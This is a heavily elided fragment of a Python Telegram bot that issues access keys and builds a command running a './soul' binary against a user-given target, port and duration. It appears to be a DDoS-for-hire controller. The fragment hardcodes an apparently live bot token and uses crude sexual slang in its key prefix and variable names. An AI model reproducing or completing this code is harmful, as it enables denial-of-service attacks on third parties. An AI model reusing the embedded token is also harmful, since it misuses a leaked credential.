...
bot = telebot.TeleBot('7526087286:AAHTmtCagqJLI1y5STlAFHF4aE68efBQbDA')
...
def create_random_key():
    key = "SYSTEM RAPE KEY-" + ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
    ...
    if len(details) == 3:
        ...
        try:
            ...
            if chudai_time > MAX_chudai_TIME:
                ...
                full_command = f"./soul {target} {port} {chudai_time} 30"  # ✅ Correct variable name
